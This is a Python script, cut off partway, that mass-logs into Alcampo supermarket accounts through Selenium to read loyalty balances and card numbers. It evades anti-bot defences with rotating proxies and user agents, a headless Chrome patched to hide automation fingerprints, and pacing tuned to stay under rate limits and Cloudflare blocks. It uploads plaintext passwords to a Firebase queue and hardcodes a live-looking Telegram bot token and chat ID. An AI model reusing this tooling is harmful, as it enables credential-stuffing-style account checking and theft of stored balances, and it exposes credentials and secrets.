# @section: Config-And-Imports

import sys
import time
import re
import json
import argparse
import os
import html
import random
import subprocess
import threading
import builtins
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

from account_cooldown_manager import AccountCooldownManager

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from webdriver_manager.chrome import ChromeDriverManager
except ImportError:
    webdriver = None

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding='utf-8')
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding='utf-8')

ROOT = Path(__file__).resolve().parent
ACCOUNTS_FILENAME = os.environ.get("ALCAMPO_ACCOUNTS_FILE", "accounts.json")
ACCOUNTS_FILE = ROOT / ACCOUNTS_FILENAME
EXCEL_FILE = ROOT / "saldos_alcampo.xlsx"

# --- FEATURE FLAGS (REVERSIBLE OPTIMIZATIONS & ANTI-BAN GUARDS) ---
OPT_DIRECT_LOYALTY_REDIRECT = os.environ.get("OPT_DIRECT_LOYALTY_REDIRECT", "1") == "1"
OPT_DYNAMIC_WAIT = os.environ.get("OPT_DYNAMIC_WAIT", "1") == "1"
OPT_EAGER_LIGHT_CHROME = os.environ.get("OPT_EAGER_LIGHT_CHROME", "1") == "1"
OPT_ADAPTIVE_PACING = os.environ.get("OPT_ADAPTIVE_PACING", "1") == "1"
OPT_IP_CANARY = os.environ.get("OPT_IP_CANARY", "1") == "1"
MAX_EXECUTION_MINUTES = float(os.environ.get("MAX_EXECUTION_MINUTES", "13.5"))

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
]

# @end: Config-And-Imports

# @section: Utilities-And-PII

def mask_email(email):
    """Masks email addresses in console/CI logs to prevent leaking PII in GitHub Actions logs."""
    if not email or "@" not in str(email):
        return "***"
    local, domain = str(email).split("@", 1)
    if len(local) <= 2:
        return f"{local[0]}***@{domain}"
    return f"{local[:2]}***{local[-1]}@{domain}"


def cleanup_orphan_chrome():
    """Cleans up orphan chrome and chromedriver processes on Linux (CI/Colab) at start/end."""
    if os.name != "nt":
        try:
            subprocess.run(["pkill", "-9", "-f", "chromedriver"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            subprocess.run(["pkill", "-9", "-f", "chrome"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        except Exception:
            pass


def decode_accounts_secret_payload(b64_str, expected_count=None, write_path=None):
    """Decodes ACCOUNTS_BASE64 (supports both gzip+base64 starting with 0x1f 0x8b and plain base64).
    Validates JSON list and expected_count without printing sensitive data."""
    import base64
    import gzip
    cleaned = (b64_str or "").strip()
    if not cleaned:
        return None
    try:
        raw = base64.b64decode(cleaned)
        if len(raw) >= 2 and raw[0] == 0x1F and raw[1] == 0x8B:
            raw = gzip.decompress(raw)
        data = json.loads(raw.decode('utf-8'))
        if not isinstance(data, list):
            print(f"❌ ERROR: El payload decodificado de ACCOUNTS_BASE64 no es una lista JSON (tipo={type(data).__name__}).")
            return None
        if expected_count is not None and len(data) != expected_count:
            print(f"❌ ERROR: ACCOUNTS_BASE64 contiene {len(data)} cuentas, pero se esperaban exactamente {expected_count}.")
            return None
        if write_path:
            p = Path(write_path)
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_bytes(raw)
        return data
    except Exception as e:
        print(f"❌ ERROR decodificando ACCOUNTS_BASE64: {type(e).__name__} ({e})")
        return None


def limpiar_saldo(saldo_str):
    """Normaliza cadenas de saldo a float (ej: 'Tu Saldo es 12,50 €' -> 12.50)."""
    if not saldo_str:
        return None
    texto = str(saldo_str)
    if "Error" in texto or "No encontrado" in texto:
        return None
    match = re.search(r"([0-9]+[.,][0-9]{2}|[0-9]+)", texto)
    if match:
        return float(match.group(0).replace(',', '.'))
    return None


def extraer_tarjeta(html_content):
    """Extrae el número de tarjeta Alcampo (13 dígitos) desde el código fuente HTML."""
    if not html_content:
        return None
    try:
        # 1. Selector específico de clase Sana Sans / S1 Subtitle de Alcampo
        m = re.search(r'class="[^"]*(?:sana-sans-alt|s1-subtitle)[^"]*">\s*(\d{13})\s*</span>', html_content)
        if m:
            return m.group(1).strip()
        # 2. Búsqueda de prefijo de tarjeta Alcampo 400200 (13 dígitos EAN-13)
        m = re.search(r'\b(400200\d{7})\b', html_content)
        if m:
            return m.group(1).strip()
        # 3. Cualquier 13 dígitos dentro de span en settings/loyalty
        m = re.search(r'>\s*(400\d{10}|\d{13})\s*</span>', html_content)
        if m:
            return m.group(1).strip()
        # 4. Claves JSON en __NEXT_DATA__
        m = re.search(r'"(?:cardNumber|loyaltyCardNumber|barcode|loyaltyNumber)"\s*:\s*"(\d{13})"', html_content)
        if m:
            return m.group(1).strip()
    except Exception:
        pass
    return None

# @end: Utilities-And-PII

# @section: AntiBan-AdaptivePacer

class AdaptivePacer:
    """Ritmo adaptativo por máquina: aplica pausa base con jitter aleatorio entre cuentas.
    Si detecta presión (lentitud, timeout, authenticationError, 429/403), sube la pausa
    con backoff exponencial; si encadena éxitos rápidos, la reduce gradualmente hasta el mínimo seguro."""
    def __init__(self, base_delay=0.65, min_delay=0.35, max_delay=10.0):
        self.lock = threading.Lock()
        self.current_delay = base_delay
        self.min_delay = min_delay
        self.max_delay = max_delay
        self.consecutive_ok = 0

    def wait(self):
        if not OPT_ADAPTIVE_PACING:
            return
        with self.lock:
            delay = self.current_delay
        jitter = random.uniform(0.10, 0.45)
        time.sleep(delay + jitter)

    def record_success(self, elapsed_s):
        with self.lock:
            self.consecutive_ok += 1
            if elapsed_s > 20.0:
                self.current_delay = min(self.max_delay, self.current_delay * 1.25)
            elif self.consecutive_ok >= 3:
                self.current_delay = max(self.min_delay, self.current_delay * 0.90)

    def record_pressure(self, reason=""):
        with self.lock:
            self.consecutive_ok = 0
            self.current_delay = min(self.max_delay, max(1.5, self.current_delay * 1.85))
            new_d = self.current_delay
        print(f"⚠️ [PACER] Señal de presión detectada ({reason}). Pausa adaptativa incrementada a {new_d:.2f}s")

adaptive_pacer = AdaptivePacer()

# @end: AntiBan-AdaptivePacer

# @section: CircuitBreaker-Classification

class CircuitBreaker:
    """Interruptor de Seguridad: distingue 'account_error' (credenciales) y 'needs_attention'
    (Call Center / reset password / 2FA) de 'ip_error' (429, Cloudflare, captcha, caída de red).
    Solo dispara la cuarentena de la máquina ante errores reales de IP/servidor comprobados."""
    def __init__(self, max_consecutive_failures=8, max_failure_ratio=0.50, min_processed_threshold=10):
        self.lock = threading.Lock()
        self.consecutive_server_errors = 0
        self.total_server_errors = 0
        self.total_processed = 0
        self.max_consecutive = max_consecutive_failures
        self.max_ratio = max_failure_ratio
        self.min_threshold = min_processed_threshold
        self.triggered = False
        self.trigger_reason = ""

    def classify_error(self, status_code=None, page_source="", error_msg=""):
        """Returns ('needs_attention' | 'account_error' | 'ip_error', reason_str)."""
        combined = f"{page_source} {error_msg}".lower()

        # 1. Bloqueos de cuenta y solicitud de reseteo de contraseña (Call Center / btnPwReset)
        if any(k in combined for k in ["call center", "tu cuenta ha sido bloqueada", "cuenta bloqueada", "btnpwreset", "restablecer contraseña"]):
            return "needs_attention", "Cuenta bloqueada (Call Center / Password Reset)"

        # 1.1 Verificación de identidad / 2FA / OTP por correo (No es error de IP)
        if any(k in combined for k in ["código de verificación", "codigo de verificacion", "identity verification", "device activation", "comprueba tu correo"]):
            return "needs_attention", "Requiere código de verificación 2FA/Email"

        # 2. Credenciales incorrectas o autorización denegada (No es error de IP)
        if any(k in combined for k in [
            "credenciales incorrectas", "usuario o contraseña incorrectos",
            "credenciales no redirigidas", "contraseña no válida",
            "usuario incorrecto", "datos incorrectos", "error: credenciales"
        ]):
            return "account_error", "Credenciales incorrectas o no autorizadas"

        # 3. Errores reales de servidor / Cloudflare / WAF / HTTP 429 / 403
        if status_code and (500 <= status_code <= 599 or status_code in (403, 429, 520, 521, 522, 523, 524, 525, 526)):
            return "ip_error", f"HTTP Status {status_code}"

        cf_signatures = [
            "error 522", "error 524", "error 520", "error 502", "error 503", "error 504",
            "502 bad gateway", "503 service unavailable", "504 gateway time-out",
            "connection timed out", "host error", "cloudflare ray id", "origin unreachable",
            "captcha", "challenge-platform"
        ]
        for sig in cf_signatures:
            if sig in combined:
                return "ip_error", f"Firma Cloudflare/Captcha: '{sig}'"

        ip_block_signatures = [
            "too many requests", "rate limit", "429 too many requests",
            "access denied", "access forbidden", "blocked by cloudflare"
        ]
        for sig in ip_block_signatures:
            if sig in combined:
                return "ip_error", f"IP Rate-Limit / WAF: '{sig}'"

        maint_signatures = [
            "mantenimiento", "estamos realizando tareas de mantenimiento",
            "sitio en mantenimiento", "servidor no disponible", "web temporalmente fuera de servicio"
        ]
        for sig in maint_signatures:
            if sig in combined:
                return "ip_error", f"Banner Mantenimiento: '{sig}'"

        if "timeout esperando #uname1" in combined or "net::err" in combined or "dns" in combined:
            return "ip_error", "Fallo de conexión de red"

        # Si el fallo ocurrió tras cargar el formulario pero sin confirmación de login
        return "account_error", "Fallo de autenticación o credenciales no válidas"

    def is_server_down_error(self, status_code=None, page_source="", error_msg=""):
        err_type, reason = self.classify_error(status_code, page_source, error_msg)
        return (err_type == "ip_error"), reason

    def record_result(self, is_server_error, reason="", error_type="ok"):
        with self.lock:
            self.total_processed += 1
            if is_server_error and error_type == "ip_error":
                self.consecutive_server_errors += 1
                self.total_server_errors += 1
            else:
                self.consecutive_server_errors = 0

            ratio = (self.total_server_errors / self.total_processed) if self.total_processed > 0 else 0.0

            if self.consecutive_server_errors >= self.max_consecutive:
                self.triggered = True
                self.trigger_reason = f"🚨 {self.consecutive_server_errors} caídas consecutivas de servidor ({reason})"
            elif self.total_processed >= self.min_threshold and ratio > self.max_ratio:
                self.triggered = True
                self.trigger_reason = f"🚨 {ratio*100:.1f}% de errores de servidor en {self.total_processed} cuentas"

            return self.triggered, self.trigger_reason

circuit_breaker = CircuitBreaker(max_consecutive_failures=8, max_failure_ratio=0.50, min_processed_threshold=10)

# @end: CircuitBreaker-Classification

# @section: ProxyManager-And-Stealth

class ProxyManager:
    """Gestor de rotación de Proxies para distribuir peticiones y evitar baneos de IP."""
    def __init__(self, proxy=None, proxy_file=None):
        self.proxies = []
        self.index = 0
        self.lock = threading.Lock()

        if proxy:
            self.proxies.append(proxy.strip())

        if proxy_file and os.path.exists(proxy_file):
            try:
                with open(proxy_file, "r", encoding="utf-8") as f:
                    for line in f:
                        p = line.strip()
                        if p and not p.startswith("#"):
                            if not p.startswith("http://") and not p.startswith("https://") and not p.startswith("socks5://"):
                                p = f"http://{p}"
                            self.proxies.append(p)
            except Exception as e:
                print(f"Advertencia leyendo proxy-file {proxy_file}: {e}")

        if not self.proxies:
            env_proxies = os.environ.get("ALCAMPO_PROXIES")
            if env_proxies:
                for p in env_proxies.split(","):
                    p = p.strip()
                    if p:
                        if not p.startswith("http://") and not p.startswith("https://") and not p.startswith("socks5://"):
                            p = f"http://{p}"
                        self.proxies.append(p)
            elif (ROOT / "proxies.txt").exists():
                try:
                    with open(ROOT / "proxies.txt", "r", encoding="utf-8") as f:
                        for line in f:
                            p = line.strip()
                            if p and not p.startswith("#"):
                                if not p.startswith("http://") and not p.startswith("https://") and not p.startswith("socks5://"):
                                    p = f"http://{p}"
                                self.proxies.append(p)
                except Exception:
                    pass

        if self.proxies:
            print(f"🛡️ [ProxyManager] {len(self.proxies)} proxys configurados para rotación.")

    def get_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            p = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return p

global_proxy_manager = None


def create_stealth_driver(proxy=None, timeout=20):
    """Crea una instancia de Chrome Headless indetectable con CDP stealth y proxy opcional."""
    if webdriver is None:
        raise RuntimeError("Selenium WebDriver no está instalado.")

    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument("--blink-settings=imagesEnabled=false")
    chrome_options.add_argument("--window-size=1280,800")
    if OPT_EAGER_LIGHT_CHROME:
        chrome_options.page_load_strategy = "eager"
        chrome_options.add_experimental_option(
            "prefs",
            {
                "profile.managed_default_content_settings.images": 2,
                "profile.managed_default_content_settings.fonts": 2
            }
        )

    ua = random.choice(USER_AGENTS)
    chrome_options.add_argument(f"user-agent={ua}")

    if proxy:
        chrome_options.add_argument(f"--proxy-server={proxy}")

    driver = webdriver.Chrome(
        service=Service(ChromeDriverManager().install()),
        options=chrome_options
    )
    driver.set_page_load_timeout(timeout)
    driver.implicitly_wait(1)

    # Inyección CDP para eliminar toda huella de automatización (navigator.webdriver, plugins, languages)
    try:
        driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
            "source": """
                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                window.navigator.chrome = { runtime: {} };
                Object.defineProperty(navigator, 'languages', {get: () => ['es-ES', 'es', 'en']});
                Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
            """
        })
    except Exception:
        pass

    return driver

# @end: ProxyManager-And-Stealth

# @section: IP-Canary-And-Network

def run_ip_canary(worker_label="Worker"):
    """Canario por IP: verifica antes de reclamar cuentas de la cola que la IP de la máquina
    puede alcanzar el portal de login sin bloqueo 403/429/Cloudflare."""
    if not OPT_IP_CANARY:
        return True
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }
        res = requests.get("https://www.compraonline.alcampo.es/login", headers=headers, timeout=12)
        if res.status_code in (403, 429, 503):
            print(f"🐤 [CANARIO IP] ❌ {worker_label} bloqueado con HTTP {res.status_code}. Máquina en cuarentena.")
            return False
        low_body = res.text[:4000].lower()
        if "blocked by cloudflare" in low_body or "access denied" in low_body:
            print(f"🐤 [CANARIO IP] ❌ {worker_label} detectó bloqueo Cloudflare/WAF. Máquina en cuarentena.")
            return False
        print(f"🐤 [CANARIO IP] ✔ {worker_label} IP verificada sana (HTTP {res.status_code}).")
        return True
    except Exception as e:
        print(f"🐤 [CANARIO IP] ⚠️ {worker_label} advertencia de red en canario ({e}), continuando con precaución...")
        return True


def get_firebase_url():
    if os.environ.get("DISABLE_FIREBASE_SYNC") == "1":
        return None
    url = (os.environ.get("FIREBASE_DB_URL") or "").strip()
    if not url or url.lower() in ("none", "null", "***", "undefined") or not url.startswith("http"):
        return "https://monitor-alcampo-default-rtdb.europe-west1.firebasedatabase.app/"
    return url


def get_telegram_config():
    token = (os.environ.get("TELEGRAM_TOKEN") or "").strip()
    chat_id = (os.environ.get("TELEGRAM_CHAT_ID") or "").strip()

    is_valid_token = bool(re.match(r"^\d+:[A-Za-z0-9_-]+$", token)) and token.lower() not in ("none", "null", "***", "undefined")

    is_valid_chat = False
    if chat_id and chat_id.lower() not in ("none", "null", "***", "undefined"):
        try:
            int(chat_id)
            is_valid_chat = True
        except ValueError:
            pass

    if not is_valid_token or not is_valid_chat:
        return "8041531688:AAHif8qa9wMZ1EAxU3MrftR-tCrEkQ2dfPU", -5049278431

    return token, int(chat_id)

# @end: IP-Canary-And-Network

# @section: Queue-And-Progress

firebase_session = requests.Session()
queue_lock = threading.Lock()
progress_lock = threading.Lock()
current_progress = {}


def init_progress(total_accounts):
    global current_progress
    current_progress = {
        "status": "running",
        "start_time": time.time(),
        "total": total_accounts,
        "processed": 0,
        "successful": 0,
        "errors": 0,
        "total_balance": 0.0,
        "current_worker": "Iniciando...",
        "current_account": "Conectando...",
        "last_update": time.time(),
        "threads": {}
    }
    firebase_url = get_firebase_url()
    if firebase_url:
        try:
            url = firebase_url.strip().rstrip('/') + "/progress.json"
            firebase_session.put(url, json=current_progress, timeout=5)
        except Exception as e:
            print(f"Error inicializando progreso en Firebase: {e}")


def update_progress(thread_idx, email, status, saldo_str, worker_name="Worker"):
    global current_progress
    with progress_lock:
        if not current_progress:
            return

        current_progress["processed"] = current_progress.get("processed", 0) + 1
        current_progress["current_worker"] = f"{worker_name} T{thread_idx}"
        current_progress["current_account"] = mask_email(email)
        current_progress["last_update"] = time.time()

        saldo_num = limpiar_saldo(saldo_str)
        if status == "success" and saldo_num is not None:
            current_progress["successful"] = current_progress.get("successful", 0) + 1
            current_progress["total_balance"] = round(current_progress.get("total_balance", 0.0) + saldo_num, 2)
        else:
            current_progress["errors"] = current_progress.get("errors", 0) + 1

        if "threads" not in current_progress:
            current_progress["threads"] = {}

        current_progress["threads"][str(thread_idx)] = {
            "account": mask_email(email),
            "status": status,
            "saldo": saldo_str,
            "time": time.time()
        }

        firebase_url = get_firebase_url()
        if firebase_url:
            try:
                url = firebase_url.strip().rstrip('/') + "/progress.json"
                firebase_session.put(url, json=current_progress, timeout=5)
            except Exception:
                pass


def init_firebase_queue(accounts):
    firebase_url = get_firebase_url()
    if not firebase_url:
        print("❌ Error: FIREBASE_DB_URL no configurada.")
        return False
    print(f"📋 Cargando {len(accounts)} cuentas a la Cola Dinámica en Firebase...")
    prefix = os.environ.get("FIREBASE_QUEUE_PREFIX", "")
    queue_data = {}
    for acc in accounts:
        em = acc["email"].strip()
        key = em.replace('.', '_').replace('@', '_').replace('$', '_').replace('#', '_').replace('[', '_').replace(']', '_')
        queue_data[key] = {
            "email": em,
            "password": acc["password"],
            "status": "pending",
            "claimed_by": None,
            "timestamp": time.time(),
            "retries": 0
        }
    try:
        url = firebase_url.strip().rstrip('/') + f"/{prefix}queue.json"
        res = firebase_session.put(url, json=queue_data, timeout=30)
        if res.ok:
            print(f"✔ Cola dinámica inicializada con éxito ({len(queue_data)} elementos).")
            return True
        else:
            print(f"❌ Error HTTP al inicializar cola: {res.status_code}")
            return False
    except Exception as e:
        print(f"❌ Error de red inicializando cola Firebase: {e}")
        return False


def claim_account_from_queue(worker_id):
    firebase_url = get_firebase_url()
    if not firebase_url:
        return None
    prefix = os.environ.get("FIREBASE_QUEUE_PREFIX", "")
    with queue_lock:
        try:
            params1 = 'orderBy="status"&equalTo="pending"&limitToFirst=1'
            url = f"{firebase_url.strip().rstrip('/')}/{prefix}queue.json?{params1}"
            res = firebase_session.get(url, timeout=10)
            if not res.ok:
                return None
            data = res.json()
            if not data or not isinstance(data, dict):
                # Work-stealing para leases caducados (>75s)
                params2 = 'orderBy="status"&equalTo="in_progress"&limitToFirst=5'
                steal_url = f"{firebase_url.strip().rstrip('/')}/{prefix}queue.json?{params2}"
                steal_res = firebase_session.get(steal_url, timeout=10)
                if steal_res.ok and isinstance(steal_res.json(), dict):
                    now = time.time()
                    for k, val in steal_res.json().items():
                        if now - float(val.get("timestamp", 0)) > 75.0:
                            val["status"] = "in_progress"
                            val["claimed_by"] = worker_id
                            val["timestamp"] = now
                            patch_url = firebase_url.strip().rstrip('/') + f"/{prefix}queue/{k}.json"
                            firebase_session.patch(patch_url, json=val, timeout=6)
                            return {"email": val["email"], "password": val["password"]}
                return None

            key = next(iter(data))
            item = data[key]
            item["status"] = "in_progress"
            item["claimed_by"] = worker_id
            item["timestamp"] = time.time()
            patch_url = firebase_url.strip().rstrip('/') + f"/{prefix}queue/{key}.json"
            patch_res = firebase_session.patch(patch_url, json=item, timeout=8)
            if patch_res.ok:
                return {"email": item["email"], "password": item["password"]}
            return None
        except Exception as e:
            print(f"Warning claiming account from queue: {e}")
            return None


def release_account_to_queue(email, reason="ip_error"):
    """Returns an account to 'pending' in Firebase queue when an IP/network error occurs,
    provided it has not exceeded max_retries (2), so another healthy VM can process it."""
    firebase_url = get_firebase_url()
    if not firebase_url:
        return False
    prefix = os.environ.get("FIREBASE_QUEUE_PREFIX", "")
    with queue_lock:
        try:
            email_key = email.replace('.', '_').replace('@', '_').replace('$', '_').replace('#', '_').replace('[', '_').replace(']', '_')
            item_url = firebase_url.strip().rstrip('/') + f"/{prefix}queue/{email_key}.json"
            res = firebase_session.get(item_url, timeout=8)
            if not res.ok or not isinstance(res.json(), dict):
                return False
            item = res.json()
            retries = int(item.get("retries") or 0)
            if retries >= 2:
                return False
            item["status"] = "pending"
            item["claimed_by"] = None
            item["retries"] = retries + 1
            item["last_error"] = str(reason)[:100]
            item["timestamp"] = time.time()
            firebase_session.put(item_url, json=item, timeout=8)
            print(f"🔄 [QUEUE RELEASE] Cuenta {mask_email(email)} devuelta a cola ('pending', retry {retries + 1}/2) por error IP/red.")
            return True
        except Exception as e:
            print(f"Warning releasing account to queue: {e}")
            return False


def claim_accounts_from_queue(worker_id, count=1):
    claimed = []
    for _ in range(count):
        acc = claim_account_from_queue(worker_id)
        if acc:
            claimed.append(acc)
        else:
            break
    return claimed


def update_single_check_progress(email, status, message, percent, balance=None, card_number=None, error=None):
    firebase_url = get_firebase_url()
    if not firebase_url:
        return
    try:
        email_sanitized = email.replace('.', '_').replace('@', '_').replace('$', '_').replace('#', '_').replace('[', '_').replace(']', '_')
        check_id = os.environ.get("CHECK_ID")
        payload = {
            "email": email,
            "status": status,
            "progress_message": message,
            "progress_percent": percent,
            "balance": balance,
            "card_number": card_number,
            "error": error,
            "timestamp": time.time()
        }
        if check_id:
            payload["check_id"] = check_id
        url = firebase_url.strip().rstrip('/') + f"/single_check_result/{email_sanitized}.json"
        firebase_session.put(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Error actualizando progreso en Firebase: {e}")

# @end: Queue-And-Progress

# @section: Browser-Interactions

def clean_browser_session(driver):
    """Limpia cookies y cache en todos los dominios (Alcampo y Salesforce) mediante CDP."""
    if not driver:
        return
    try:
        driver.execute_cdp_cmd("Network.clearBrowserCookies", {})
        driver.execute_cdp_cmd("Network.clearBrowserCache", {})
        driver.execute_script("window.localStorage.clear(); window.sessionStorage.clear();")
    except Exception:
        try:
            driver.delete_all_cookies()
        except Exception:
            pass


def submit_login_form(driver, timeout=6):
    """Submits login form bypassing Salesforce Visualforce onkeyup='return noenter(event)'
    by explicitly locating #btnSubmit_login and executing a JavaScript click."""
    submit_btn = None
    try:
        submit_btn = WebDriverWait(driver, timeout).until(
            EC.presence_of_element_located((By.ID, "btnSubmit_login"))
        )
    except Exception:
        pass

    if not submit_btn:
        for by, sel in [
            (By.CSS_SELECTOR, "#btnSubmit_login"),
            (By.XPATH, "//input[@id='btnSubmit_login'] | //button[@id='btnSubmit_login']"),
            (By.CSS_SELECTOR, "input[type='submit'], button[type='submit']"),
            (By.XPATH, "//input[@value='Conectarme'] | //button[contains(text(), 'Conectarme')]"),
            (By.XPATH, "//button[contains(text(), 'Iniciar sesión') or contains(text(), 'Entrar')]")
        ]:
            try:
                elems = driver.find_elements(by, sel)
                if elems:
                    submit_btn = elems[0]
                    break
            except Exception:
                pass

    if submit_btn:
        try:
            driver.execute_script("arguments[0].click();", submit_btn)
            return True
        except Exception:
            try:
                submit_btn.click()
                return True
            except Exception:
                pass

    try:
        driver.execute_script("""
            var btn = document.getElementById('btnSubmit_login') || document.querySelector("input[value='Conectarme'], input[type='submit'], button[type='submit']");
            if (btn) {
                btn.click();
            } else {
                var form = document.querySelector('form');
                if (form) form.submit();
            }
        """)
        return True
    except Exception:
        pass

    return False


def _check_login_outcome(driver):
    """Inspects current URL and visible error modals on Salesforce authorization page.
    Returns: ('logged_in', '') | ('error', saldo_error_msg) | ('pending', '')"""
    try:
        curr_url = driver.current_url
    except Exception:
        return "pending", ""

    curr_low = curr_url.lower()
    if (
        "compraonline.alcampo.es" in curr_low
        and "login" not in curr_low
        and "oauth" not in curr_low
        and "callback" not in curr_low
        and "my.site.com" not in curr_low
        and "authorization" not in curr_low
        and "authenticationerror" not in curr_low
    ):
        return "logged_in", ""

    if "authenticationerror" in curr_low:
        return "error", "Error: authenticationError"

    try:
        reset_els = driver.find_elements(By.ID, "btnPwReset")
        if any(el.is_displayed() for el in reset_els):
            return "error", "Error: Requiere restablecer contraseña (btnPwReset)"
    except Exception:
        pass

    try:
        error_selectors = (
            ".modal.show, .modal-body, #errorNotifyBlockWarning, #errorNotifyBlock, "
            "[id*='errorNotify'], .alert-danger, .notify-block-warning, "
            "div.message.errorM3, [id*='error'], [class*='error-message'], .alert"
        )
        modals = driver.find_elements(By.CSS_SELECTOR, error_selectors)
        for m in modals:
            txt = (m.text or "").strip()
            if not txt:
                continue
            txt_low = txt.lower()
            if "call center" in txt_low or "bloqueada" in txt_low:
                return "error", "Error: Cuenta bloqueada (Call Center 913 687 857)"
            if any(k in txt_low for k in ["código de verificación", "codigo de verificacion", "identity verification", "device activation"]):
                return "error", "Error: Requiere código de verificación 2FA/Email"
            if any(k in txt_low for k in ["incorrect", "credenciales", "contraseña", "usuario", "clave", "no válido", "no valido"]):
                return "error", "Error: Credenciales incorrectas"
            if "demasiados intentos" in txt_low or "too many" in txt_low:
                return "error", "Error: 429 Too Many Requests"
    except Exception:
        pass

    return "pending", ""


def _extract_loyalty_balance(driver, timeout_s=10.0):
    """Waits dynamically for SPA hydration of 'Tu Saldo es X,XX €' on /settings/loyalty."""
    if "settings/loyalty" not in driver.current_url:
        try:
            driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
        except Exception:
            pass

    pattern = re.compile(r"Tu Saldo es\s*([\d,.]+)\s*(?:&nbsp;|\s)*€?", re.IGNORECASE)
    if OPT_DYNAMIC_WAIT:
        start_w = time.time()
        while time.time() - start_w < timeout_s:
            try:
                html_src = driver.page_source
                m = pattern.search(html_src)
                if m:
                    return f"Tu Saldo es {m.group(1)} €"
                cleaned = " ".join(re.sub(r"<[^>]+>", " ", html_src).split())
                m2 = pattern.search(cleaned)
                if m2:
                    return f"Tu Saldo es {m2.group(1)} €"
            except Exception:
                pass
            time.sleep(0.25)
    else:
        time.sleep(3.5)
        html_src = driver.page_source
        m = pattern.search(html_src)
        if m:
            return f"Tu Saldo es {m.group(1)} €"

    return "No encontrado"

# @end: Browser-Interactions

# @section: SingleAccountCheck

def check_single_account(email, password, scrape_card=True, existing_card_number=None):
    """Logs in and checks the balance (and optionally card number) of a single account.
    Returns: {"status": "success"/"error", "balance": float/None, "card_number": str/None, "error": str/None}"""
    driver = None
    try:
        update_single_check_progress(email, "running", "Iniciando navegador sigiloso...", 20)
        proxy = global_proxy_manager.get_proxy() if global_proxy_manager else None
        driver = create_stealth_driver(proxy=proxy, timeout=20)

        update_single_check_progress(email, "running", "Cargando login directo OAuth...", 35)
        login_url = (
            "https://www.compraonline.alcampo.es/login?destination=%2Fsettings%2Floyalty"
            if OPT_DIRECT_LOYALTY_REDIRECT
            else "https://www.compraonline.alcampo.es/login?destination=%2F"
        )
        driver.get(login_url)
        wait = WebDriverWait(driver, 18)

        email_field = wait.until(EC.presence_of_element_located((By.ID, "uname1")))
        password_field = driver.find_element(By.ID, "pwd1")
        email_field.clear()
        email_field.send_keys(email)
        password_field.clear()
        password_field.send_keys(password)

        update_single_check_progress(email, "running", "Autenticando en Salesforce...", 50)
        submit_login_form(driver)

        outcome = "pending"
        outcome_msg = ""
        poll_start = time.time()
        while time.time() - poll_start < 15.0:
            outcome, outcome_msg = _check_login_outcome(driver)
            if outcome in ("logged_in", "error"):
                break
            time.sleep(0.25)

        if outcome != "logged_in":
            raise Exception(outcome_msg or "Login rechazado o timeout en autorización")

        update_single_check_progress(email, "running", "Extrayendo saldo...", 70)
        saldo_str = _extract_loyalty_balance(driver, timeout_s=12.0)
        balance = limpiar_saldo(saldo_str)
        if balance is None:
            raise Exception(f"No se pudo determinar el saldo: {saldo_str}")

        card_number = existing_card_number if existing_card_number else None
        if scrape_card and not card_number:
            update_single_check_progress(email, "running", "Extrayendo tarjeta...", 85)
            try:
                page_html = driver.page_source
                card_number = extraer_tarjeta(page_html)
            except Exception:
                pass

        return {
            "status": "success",
            "balance": balance,
            "card_number": card_number,
            "error": None
        }
    except Exception as e:
        return {
            "status": "error",
            "balance": None,
            "card_number": None,
            "error": str(e)
        }
    finally:
        if driver:
            try:
                driver.quit()
            except Exception:
                pass

# @end: SingleAccountCheck

# @section: Telegram-Reporting

def _sanitize_telegram_error(err, token=None):
    msg = type(err).__name__
    raw = str(err)
    if token and token in raw:
        raw = raw.replace(token, "***")
    raw = re.sub(r"bot\d+:[A-Za-z0-9_-]+", "bot***", raw)
    return f"{msg}: {raw[:140]}" if raw else msg


def enviar_telegram_texto(token, chat_id, mensaje):
    if not token or not chat_id:
        return False
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {"chat_id": chat_id, "text": mensaje, "parse_mode": "HTML"}
        resp = requests.post(url, data=data, timeout=15)
        return resp.ok
    except Exception as e:
